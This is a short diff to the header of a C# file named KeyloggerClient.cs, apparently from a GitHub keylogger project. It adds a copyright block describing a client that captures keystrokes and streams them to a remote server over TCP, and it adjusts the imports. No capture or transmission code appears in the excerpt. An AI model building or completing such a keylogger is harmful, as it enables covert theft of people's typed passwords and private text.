@@ -1,7 +1,25 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Net;
+﻿/*************************************************************************
+ *                                                                       *
+ *  File:        KeyloggerClient.cs                                      *
+ *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
+ *                         Cojocaru Valentin                             *
+ *  Website:     https://github.com/GlavanPavel/Keylogger                *
+ *  Description: A console-based keylogger client that captures and      *
+ *               sends keystrokes to a remote server using TCP.          *
+ *               Identifies itself to the server and transmits captured  *
+ *               data in real time. Includes support for asynchronous    *
+ *               logging and cancellation.                               *
+ *                                                                       *
+ *  This code and information is provided "as is" without warranty of    *
+ *  any kind, either expressed or implied, including but not limited     *
+ *  to the implied warranties of merchantability or fitness for a        *
+ *  particular purpose. You are free to use this source code in your     *
+ *  applications as long as the original copyright notice is included.   *
+ *                                                                       *
+ *************************************************************************/
+
+
+using System;
 using System.Net.Sockets;
 using System.Runtime.InteropServices; // for using GetAsyncKeyState()
 using System.Text;
